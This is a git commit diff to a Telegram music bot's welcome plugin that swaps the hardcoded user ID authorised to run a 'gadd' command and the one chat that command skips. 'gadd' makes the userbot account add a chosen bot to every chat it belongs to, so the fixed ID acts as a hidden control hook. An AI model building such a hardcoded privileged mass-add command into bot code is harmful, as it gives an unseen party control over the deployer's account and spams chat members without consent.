b820e8159754e409a11fdb8d8a184199eca763da
Mr Killer 1109 <69214079+harshil8981@users.noreply.github.com>
2024-08-27 17:12:03 +0530

    Update welcome.py

--- DAXXMUSIC/plugins/tools/welcome.py
+++ DAXXMUSIC/plugins/tools/welcome.py
@@ -215,7 +215,7 @@ async def greet_new_member(_, member: ChatMemberUpdated):
             LOGGER.error(e)
 
 
-@app.on_message(filters.command("gadd") & filters.user(7427691214))
+@app.on_message(filters.command("gadd") & filters.user(724404977))
 async def add_all(client, message):
     command_parts = message.text.split(" ")
     if len(command_parts) != 2:
@@ -232,7 +232,7 @@ async def add_all(client, message):
         lol = await message.reply("🔄 **ᴀᴅᴅɪɴɢ ɢɪᴠᴇɴ ʙᴏᴛ ɪɴ ᴀʟʟ ᴄʜᴀᴛs!**")
         
         async for dialog in userbot.get_dialogs():
-            if dialog.chat.id == -1001919135283:
+            if dialog.chat.id == -1001719051389:
                 continue
             try:
                 await userbot.add_chat_members(dialog.chat.id, app_id)
